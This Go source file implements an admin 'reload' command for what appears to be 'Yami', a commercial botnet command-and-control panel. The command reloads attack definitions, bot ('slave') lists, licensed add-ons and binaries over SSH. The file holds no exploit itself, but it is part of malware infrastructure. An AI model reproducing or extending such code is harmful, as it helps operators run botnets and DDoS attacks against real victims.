package commands

import (
	"Yami/core/models/Json"
	BinLoad "Yami/core/models/bin"
	"Yami/core/clients/branding"
	"Yami/core/clients/client"
	Sessions "Yami/core/clients/session"
	License "Yami/core/models/license"
	"log"
	"strconv"

	"golang.org/x/crypto/ssh"
)

// branding reload command
func init() {
	Register(&Command{
		Name: "reload",
		Admin: true,
		Reseller: false,

		
		Descriptions: "Reloads all assets and offsets for the cnc!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session, cmd []string) error {

			Loaded, err := Branding.CompleteLoad(); if err != nil {
				channel.Write([]byte("[ \x1b[38;5;1mFATAL\x1b[0m ] Failed to reload any branding files\r\n"))
			} else {
				channel.Write([]byte("[ \x1b[38;5;2mOK\x1b[0m ] Reloaded "+strconv.Itoa(Loaded)+" Commands Branding Configs Correctly\r\n"))
			}

			log.Printf(" [RELOADED] [Reloaded Text Commands Correctly] [%d]", Loaded)

			status, error := JsonParse.LoadAttacks(); if error != nil && !status {
				channel.Write([]byte("[ \x1b[38;5;1mFATAL\x1b[0m ] Failed to load attack sync from attack.json\r\n"))
				return nil
			} else {
				channel.Write([]byte("[ \x1b[38;5;2mOK\x1b[0m ] Reloaded Attack sync from attack.json correctly\r\n"))
			}

			log.Println(" [RELOADED] [Reloaded Attack Sync Correctly]")

			status, error = JsonParse.LoadConfig(); if error != nil && !status {
				channel.Write([]byte("[ \x1b[38;5;1mFATAL\x1b[0m ] Failed to load config sync from config.json\r\n"))
				return nil
			} else {
				channel.Write([]byte("[ \x1b[38;5;2mOK\x1b[0m ] Reloaded config sync from config.json correctly\r\n"))
			}

			log.Println(" [RELOADED] [Reloaded Config Sync Correctly]")

			status, error = JsonParse.LoadSlaves(); if error != nil && !status {
				channel.Write([]byte("[ \x1b[38;5;1mFATAL\x1b[0m ] Failed to load slaves sync from slaves.json\r\n"))
				return nil
			} else {
				channel.Write([]byte("[ \x1b[38;5;2mOK\x1b[0m ] Reloaded slave sync from slaves.json correctly\r\n"))
			}



			if License.LiveWire {
				status, error = JsonParse.LoadLiveWire(); if error != nil && !status {
					channel.Write([]byte("[ \x1b[38;5;1mFATAL\x1b[0m ] Failed to load Live Wire DLC sync from livewire-DLC.json\r\n"))
					return nil
				} else {
					channel.Write([]byte("[ \x1b[38;5;2mOK\x1b[0m ] Reloaded Live Wire DLC sync from livewire-DLC.json correctly\r\n"))
				}

				log.Println(" [RELOADED] [Reloaded Live Wire DLC Correctly]")
			}

			status, error = JsonParse.LoadOptions(); if error != nil && !status {
				channel.Write([]byte("[ \x1b[38;5;1mFATAL\x1b[0m ] Failed to load Options sync from options.json\r\n"))
				return nil
			} else {
				channel.Write([]byte("[ \x1b[38;5;2mOK\x1b[0m ] Reloaded options sync from options.json correctly\r\n"))
			}

			log.Println(" [RELOADED] [Reloaded Options Correctly]")


			ClientPoly.PolyLoader(channel)

			BinLoad.Load(channel)

			channel.Write([]byte("[ \x1b[38;5;11mDONE\x1b[0m ] Completed Reload of all assets\r\n"))


			return nil
		},
	})
}